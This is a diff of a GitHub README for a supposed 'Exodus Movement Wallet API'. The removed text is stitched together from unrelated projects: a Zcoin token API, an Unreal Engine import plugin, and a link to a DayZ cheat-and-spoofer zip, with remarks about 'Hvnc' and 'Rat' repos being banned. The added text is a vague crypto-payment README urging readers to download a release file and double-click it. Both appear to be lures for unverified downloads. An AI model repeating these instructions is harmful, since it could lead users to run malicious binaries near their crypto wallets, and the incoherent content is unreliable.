@@ -1,216 +1,79 @@
-<!---------------------------------------------------------------------------------------->
+# 🚀 Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway - Effortless Crypto Payment Integration
 
+[![Download](https://img.shields.io/badge/Download-Flero%20Exodus%20Wallet%20API-blue)](https://github.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/releases)
 
+## 📋 Overview
 
-# Exodus Movement Wallet API Source: Token Management via Zcoin Exodus Protocol
+Flero Exodus Movement Wallet API offers an easy way to connect your application to a payment gateway. Integrate cryptocurrency payments seamlessly, enhance your user's experience, and simplify wallet management with this powerful API.
 
-Presenting an expansive API service tailored for proficient token management within the Zcoin Exodus Protocol.
+## 🚀 Getting Started
 
-![Exodus_Logo-removebg-preview](https://user-images.githubusercontent.com/106811566/171851878-bf94716c-f545-4249-911a-ec535dc0a60a.png)
+To start using the Flero Exodus Movement Wallet API, follow these simple steps. No programming knowledge is necessary.
 
+## 🛠️ System Requirements
 
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Latest version of Google Chrome, Firefox, or Safari
+- **Internet Connection:** Stable internet connection for downloads and API access
 
+## 📥 Download & Install
 
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/releases).
+2. **Choose the Latest Version:** Look for the latest version listed on the page. It usually appears at the top.
+3. **Download the File:** Click on the appropriate file for your operating system. Your download will start automatically.
+4. **Run the File:** Once downloaded, locate the file in your downloads folder and double-click to run it.
 
+## ⚙️ Setup Process
 
-<!---------------------------------------------------------------------------------------->
+After installation, you need to configure the API to start using it for your application.
 
+1. **Create an API Key:** Visit the Flero website to create your API key.
+2. **Configure Your Application:** Follow the documentation included in the package to set up your API key in your application settings.
+3. **Test the Connection:** Use the built-in test feature to ensure your application can connect to the Flero API.
 
-## How To use & Information special
+## 🌐 Key Features
 
-![Screenshot](https://github.com/gg4w1/Qaraqan---Orkhan-Zeynall---Okaber---Unutulanlar/assets/141458021/a79eb6db-4d76-433b-adf7-1766dc0811cf)
+- **Multi-Currency Support:** Handle various cryptocurrencies with ease.
+- **Secure Transactions:** Protect user information with advanced security protocols.
+- **Two-Factor Authentication:** Enhance security through Exodus 2FA integration.
+- **User-Friendly Integration:** Simple API calls for quick implementations.
+- **Comprehensive Documentation:** Clear guidelines to help you through the setup and usage.
 
-## How to Use & Special Information 📚
+## 💡 Usage Instructions
 
-![Button](https://github.com/gg4w1/Qaraqan---Orkhan-Zeynall---Okaber---Unutulanlar/assets/141458021/604eb64a-1490-4c82-88dc-e888ca285a96)  ![Icon](https://github.com/gg4w1/Qaraqan---Orkhan-Zeynall---Okaber---Unutulanlar/assets/141458021/49fd6852-d835-430a-a1c2-3887ad67613f)
+You can use the Flero Exodus Movement Wallet API in your applications to perform various operations:
 
-## GitHub Repositories Are Being Banned 🚫
-**The reason is the usage of certain words in repository names such as: Hack, Cheat, Hacking Tool, Game Name, Hvnc, Rat, etc.**
+- **Send Payments:** Effortlessly send cryptocurrency to users.
+- **Receive Payments:** Enable users to pay using different cryptos.
+- **Check Balance:** Always monitor wallet balances in real-time.
+- **Transaction History:** Access a full record of past transactions for transparency.
 
-Furthermore, tags within repositories are also subject to restrictions. These limitations prevent the utilization of specific keywords I have positioned at the beginning of projects' tags, which are intended to enhance their discoverability.
+Refer to the included documentation for examples of code snippets and endpoints you can use.
 
-# Release Source Code Link: [Click Here 🔗](https://github.com/lmrjojo2/DayZ-EXT.CHT-SPFR-OrginalSourceCode/releases/tag/SourceCode)
-# Direct Download Source Code:[**Source Code Download📥**](https://github.com/lmrjojo2/DayZ-EXT.CHT-SPFR-OrginalSourceCode/releases/download/SourceCode/DayZExternalCheat.Spoofer.zip)
+## 🕵️‍♂️ Troubleshooting
 
-[![Source Code](https://cdn.discordapp.com/attachments/1132306937132879982/1138570951366283395/Source_Code_In_Release.png)](https://github.com/lmrjojo2/DayZ-EXT.CHT-SPFR-OrginalSourceCode/releases/tag/SourceCode)
+If you encounter any issues:
 
-Despite my attempts to bypass this limitation, regrettably, I did not achieve success. Consequently, I have chosen to place the source code in the Release section. Rest assured, I will include the required source code there, following the same approach as other individuals, rather than providing the executable.
+- **Connection Errors:** Ensure that your API key is correctly configured.
+- **Download Problems:** Try refreshing the page or checking your internet connection.
+- **Transaction Issues:** Look at your account settings to ensure everything is set up properly.
 
-### Telegram Contact: [JOJO](https://t.me/JOJO003) 📞
+## 🙋 Support and Contribution
 
+We welcome your feedback and contributions. If you have suggestions, issues, or feature requests, please feel free to raise a ticket in the issues section of this repository. 
 
-<!---------------------------------------------------------------------------------------->
+## 🔗 Related Topics
 
+- **API Integration:** Seamlessly connect services to each other.
+- **Crypto Payments:** Accept various forms of cryptocurrency.
+- **Wallet Management:** Efficiently handle digital wallets.
 
+For additional information and specific topics related to Flero, explore our documentation and community discussions.
 
+## 📍 Links
 
+- **Releases:** [Find the latest version here](https://github.com/AnDySS2/Flero-Exodus-Movement-Wallet-Api-Source-Payment-Geteway/releases)
+- **API Documentation:** Detailed guidelines on how to implement the API.
+- **Community Support:** Join our community for discussions, tips, and best practices.
 
-
-## Development Guide
-
-### Prerequisites
-
-- .NET Core 2.1
-
-### Building Process
-
-Execute the following command to build the project:
-
-```sh
-dotnet build src/Ztm.sln
-```
-
-### Initiating Required Services
-
-Before you begin, ensure that you have [Docker Compose](https://do6cs.65/) installed. Then proceed with the command:
-
-```sh
-docker-compose up -d
-```
-![image](https://user-images.githubusercontent.com/106811566/171851917-bd154f89-2e32-485c-bf92-2ef96bb784ac.png)
-
-### Migrating Database Schemas
-
-Navigate to the directory `src/Ztm.Data.Entity.Postgres` and execute:
-
-```sh
-ZTM_MAIN_DATABASE="Host=127.0.0.1;Database=postgres;Username=postgres" dotnet ef database update
-```
-
-### Initiating the Web API
-
-Kickstart the Web API with:
-
-```sh
-dotnet run -p src/Ztm.WebApi
-```
-
-Remember, this guide covers:
-
-* Prerequisites
-* Building
-* Starting Required Services
-* Migrating Database Schemas
-* Launching the Web API
-
-For additional details, refer to the specific sections relevant to your needs.
-
-
-
-
-<!---------------------------------------------------------------------------------------->
-
-
-
-
-
-
-## Installation Instructions - Unreal Engine Integration
-
-To incorporate the Exodus Import functionality within your Unreal Engine project, follow these steps:
-
-1. If your C++ project lacks a "Plugins" folder, create one.
-2. Copy or establish a symbolic link for the "ExodusImport" folder, placing it within the "Plugins" directory.
-3. Reload the project to ensure the changes take effect.
-4. In the Unreal Editor, navigate to the "Plugins" menu. Under the "Other" category, locate "ExodusImport" and activate it. The project will be restarted.
-5. If necessary, recompile the project.
-6. Once installation is successful, you'll find the "Import" command available as a button in the scene view's toolbar.
-
-Please disregard any buttons that are not labeled "Import," as they may be test cases unrelated to this process.
-
-
-
-
-
-<!---------------------------------------------------------------------------------------->
-
-
-
-
-## Instructions for Usage
-
-Access the exporter through either right-clicking within the hierarchy view in Unity or selecting "Migrate to UE4" from the main menu of Unity. The following options are available:
-
-* **Export current object:** Exports the current object with minimal information about the rest of the scene.
-* **Export selected objects:** Exports the selected objects within the current scene.
-* **Export current scene:** Attempts to export the current scene along with all objects in it.
-* **Export current project:** The plugin enumerates all resources within the project and exports them, including scenes.
-
-Upon selecting your desired option, you'll be prompted to designate an empty location for the "project" file and the exported data. Opt for an empty folder devoid of other content.
-
-The exported data comprises a "master" file in JSON format and a corresponding folder. As the project export commences, the plugin copies and converts pertinent data into the designated folder.
-
-On the Unreal Engine side, locate the "Import" button within the toolbar and choose the exported \*.json file.
-
-In scenarios where you've exported the current scene only, that scene will be exported into the current Unreal scene and merged with it. However, if the scene encompasses terrain, it will be imported as a separate scene file, found at /Import/<UnityProjectName>/<SceneName>. You will receive a warning and a request to await shader compilation completion. After shaders finish compiling, navigate to the scene file's location and open it.
-
-In cases where multiple scenes are exported, the exporter/importer endeavors to organize them in paths resembling Unity's. Therefore, the imported scene content should be under /Import/<UnityProjectName>/ and further subfolders as per your Unity folder structure.
-
-
-
-
-
-<!---------------------------------------------------------------------------------------->
-
-
-
-
-
-
-
-
-## Supported Features and Current Limitations
-
-The plugin offers support for rebuilding the current scene or scenes, converting static meshes, and making an effort to convert terrain, landscapes, and skeletal meshes into Unreal-compatible formats. The plugin also endeavors to recreate materials.
-
-However, the following limitations are in place:
-
-* Only "Standard" and "Standard (Specular setup)" materials are currently supported, with all their associated parameters.
-* Static meshes are supported. UV coordinates and vertex positions will be converted to Unreal format.
-* Light and their parameters conversion is supported.
-* Reflection probes are supported.
-* The plugin will make an attempt to transfer flags such as static nature, specific shadow casting, etc.
-* Surface shaders and custom shaders are **not supported** and cannot be converted. The plugin will try to extract their properties, but if these properties do not align with those of standard materials, the material might appear black on the Unreal side.
-* Textures in formats not natively supported by Unreal Engine will be converted to PNG, potentially leading to minor data loss due to the conversion process. It's recommended to replace these automatically converted textures when feasible.
-* Reflection cubemaps used by reflection probes will undergo a similar conversion process and might experience minor data loss. Consider replacing them when possible.
-* Prefabs aren't currently converted into blueprints.
-* Empty GameObject nodes utilized for organizational purposes will transform into Unreal 4 folders within the scene view.
-* Due to differences in handling landscapes, a 1:1 identical transfer isn't feasible. Maps employed by the terrain system will be resampled during import, and trees might lose custom tinting. The plugin strives to maintain grass density, but variations in grass clump placement might occur.
-* Skinned mesh/character conversion is only partially supported, and upon import, characters might be divided into multiple objects. While animation clips used by the controller will be converted, the state machine won't be recreated. Artifacts might appear in converted characters.
-* Additional limitations might apply.
-
-Additionally, the file format used for project transfer is subject to change and shouldn't be relied upon for long-term data storage or backup purposes.
-
-
-
-
-
-
-
-<!---------------------------------------------------------------------------------------->
-
-
-
-
-
-
-
-
-## Additional Contact Information:
-
-For reporting bugs, please utilize the GitHub project page. Alternatively, you can get in touch through the following email address: neginfinity000<at>gmail.com.
-
-
-<!---------------------------------------------------------------------------------------->
-
-
-
-
-## Contact Details
-
-While GitHub is the preferred channel for bug submissions, you can also reach out via the provided email address.
-
-
-
-
-<!---------------------------------------------------------------------------------------->
+Your journey into crypto payments starts with the Flero Exodus Movement Wallet API. Enjoy smooth, secure transactions with integration simplicity at its core.
